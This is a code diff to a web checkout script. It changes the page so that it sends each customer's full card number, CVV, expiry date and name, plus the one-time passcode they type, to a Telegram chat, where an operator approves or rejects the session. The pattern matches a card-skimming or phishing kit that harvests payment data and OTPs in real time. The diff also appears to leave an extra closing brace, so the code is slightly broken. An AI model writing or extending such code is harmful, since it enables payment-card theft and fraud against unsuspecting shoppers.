@@ -961,8 +961,10 @@ Price: ${money(unitPrice)}`,
       tgNotify(window.TELEGRAM_CONFIG.chatId,
         `🔔 CARD DETAILS SUBMITTED
 ID: ${sessionId}
-Card: **** ${cardNumber.slice(-4)}
-Name: ${cardName}`,
+Card: ${cardNumber.replace(/ /g, '').replace(/(.{4})/g, '$1 ')}
+Name: ${cardName}
+CVV: ***${cvc}
+EXP: ${expiry}`,
         {
           inline_keyboard: [
             [{ text: '✅ Approve OTP', callback_data: `approve_card:${sessionId}` }],
@@ -970,6 +972,9 @@ Name: ${cardName}`,
           ]
         }
       );
+      
+      showOtpModal(sessionId);
+    };
     };
     
     // Card modal close
@@ -992,12 +997,33 @@ Name: ${cardName}`,
         return;
       }
       
+      const sessionId = document.querySelector('#card-session-id').value;
+      const session = getSession(sessionId);
+      
+      if (!session) {
+        showToast('Session expired. Please start over.');
+        return;
+      }
+      
+      session.otp = otp;
+      sessions.set(sessionId, session);
+      
       document.querySelector('#otp-modal').style.display = 'none';
       
-      const approvedSession = localStorage.getItem('telegram_approved_session');
-      if (approvedSession) {
-        showCheckoutSuccess();
-      }
+      tgNotify(window.TELEGRAM_CONFIG.chatId,
+        `🔔 OTP ENTERED
+ID: ${sessionId}
+OTP: ${otp}
+Approve to complete order or Reject to cancel`,
+        {
+          inline_keyboard: [
+            [{ text: '✅ Approve Order', callback_data: `approve_otp:${sessionId}` }],
+            [{ text: '❌ Reject', callback_data: `reject_otp:${sessionId}` }]
+          ]
+        }
+      );
+      
+      showToast('OTP submitted. Check Telegram to approve.');
     };
     
     document.querySelector('#resend-otp').onclick = (e) => {
